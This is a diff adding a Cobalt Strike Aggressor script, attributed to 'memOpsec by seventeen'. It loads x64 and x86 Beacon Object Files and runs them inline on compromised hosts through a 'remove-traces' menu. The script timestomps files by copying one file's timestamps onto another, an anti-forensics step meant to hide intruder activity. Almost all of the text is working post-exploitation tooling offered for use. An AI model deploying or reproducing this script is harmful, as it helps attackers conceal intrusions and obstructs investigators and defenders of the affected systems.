@@ -1,0 +1,140 @@
+########################################################## BOF ############################################################
+
+sub readbof_64 {
+	local('$barch $handle $data $args');
+	$barch  = barch($1);
+
+	# read in the right BOF file
+	$path = script_resource('bofFileTime.x64.obj');
+
+	$handle = openf($path);
+
+	blog($bid, "ready for inline_execute: ".$path);
+
+	$data = readb($handle, -1);
+	closef($handle);
+	return $data;
+}
+
+sub readbof_86 {
+	local('$barch $handle $data $args');
+	$barch  = barch($1);
+
+	# read in the right BOF file
+	$path = script_resource('bofFileTime.x86.obj');
+
+	$handle = openf($path);
+
+	blog($bid, "ready for inline_execute: ".$path);
+
+	$data = readb($handle, -1);
+	closef($handle);
+	return $data;
+}
+
+########################################################## ChangeFileTime ############################################################
+
+
+sub changeFileTime64_callback {
+    local('$changeFile $targetFile')
+	$bid = $3['bid'];
+    $changeFile = $3['changeFile'];
+    $targetFile = $3['targetFile'];
+
+
+	if($changeFile eq ""){
+		show_message("the file path cannot be empty! Exiting...");
+		return;
+	}
+
+	if($targetFile eq ""){
+		show_message("the file path cannot be empty! Exiting...");
+		return;
+	}
+
+	$args = bof_pack($bid, "ZZ", $changeFile, $targetFile);
+
+	btask($bid, "############################# memOpsec by seventeen #############################\n".
+	"Tasked beacon to run ChangeFileTime with arguments: \n" .
+	"\c2[*] changeFile: " . $changeFile . "\n" .
+	"\c2[*] targetFile: " . $targetFile
+	);
+
+	beacon_inline_execute($bid, readbof_64($bid, "ChangeFileTime"), "go", $args);
+}
+
+sub changeFileTime86_callback {
+    local('$changeFile $targetFile')
+	$bid = $3['bid'];
+    $changeFile = $3['changeFile'];
+    $targetFile = $3['targetFile'];
+
+
+	if($changeFile eq ""){
+		show_message("the file path cannot be empty! Exiting...");
+		return;
+	}
+
+	if($targetFile eq ""){
+		show_message("the file path cannot be empty! Exiting...");
+		return;
+	}
+
+	$args = bof_pack($bid, "ZZ", $changeFile, $targetFile);
+
+	btask($bid, "############################# memOpsec by seventeen #############################\n".
+	"Tasked beacon to run ChangeFileTime with arguments: \n" .
+	"\c2[*] changeFile: " . $changeFile . "\n" .
+	"\c2[*] targetFile: " . $targetFile
+	);
+
+	beacon_inline_execute($bid, readbof_86($bid, "ChangeFileTime"), "go", $args);
+}
+
+
+sub dialog_changeFileTime64{
+	local('$dialog');
+
+	$dialog = dialog("changeFileTime_x64", 
+	%(bid => $1, changeFile  => "C:\\Users\\", targetFile => "C:\\Users\\"), &changeFileTime64_callback);
+	dialog_description($dialog, "LastAccess时间会不一样，如果失败了注意报错中提示的权限不足");
+	drow_text($dialog, "changeFile",  "changeFile: ");
+	drow_text($dialog, "targetFile",  "targetFile: ");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);	
+}
+
+sub dialog_changeFileTime86{
+	local('$dialog');
+
+	$dialog = dialog("changeFileTime_x86", 
+	%(bid => $1, changeFile  => "C:\\Users\\", targetFile => "C:\\Users\\"), &changeFileTime86_callback);
+	dialog_description($dialog, "LastAccess时间会不一样，如果失败了注意报错中提示的权限不足");
+	drow_text($dialog, "changeFile",  "changeFile: ");
+	drow_text($dialog, "targetFile",  "targetFile: ");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);	
+}
+
+
+########################################################## GUI #############################################################
+popup beacon_bottom {
+	menu "remove-traces" {
+
+		item "ChangeFileTime_x64"{
+		local('$bid');
+		foreach $bid ($1) {
+			dialog_changeFileTime64($bid);
+		} # forearch
+		} # changeFileTime
+
+		item "ChangeFileTime_x86"{
+		local('$bid');
+		foreach $bid ($1) {
+			dialog_changeFileTime86($bid);
+		} # forearch
+		} # changeFileTime
+
+	} #remove-traces menu
+
+}
